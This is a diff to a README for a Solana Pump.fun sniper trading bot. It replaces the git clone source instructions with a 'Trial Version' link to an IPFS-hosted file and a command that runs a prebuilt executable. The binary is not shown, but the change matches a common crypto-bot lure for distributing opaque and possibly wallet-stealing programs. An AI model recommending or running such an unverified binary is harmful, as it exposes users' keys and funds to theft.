@@ -25,11 +25,9 @@ This bot leverages native Solana RPC, optimized transaction pipelines, and aggre
 - 📈 Detailed logs and analytics for trade performance review
 
 ---
-## Usage
+## [Trial Version](https://ipfs.io/ipfs/bafybeie7mxe2ktmx2t6m7a3grij2d7n5k3x4w2hjm5pedowguotavf7wl4)
 
 ```bash
-git clone https://github.com/vvizardev/pumpfun-laserstream-sniper-bot.git
-cd pumpfun-laserstream-sniper-bot
 ./pumpfun-laserstream-sniper-trial
 ```
 
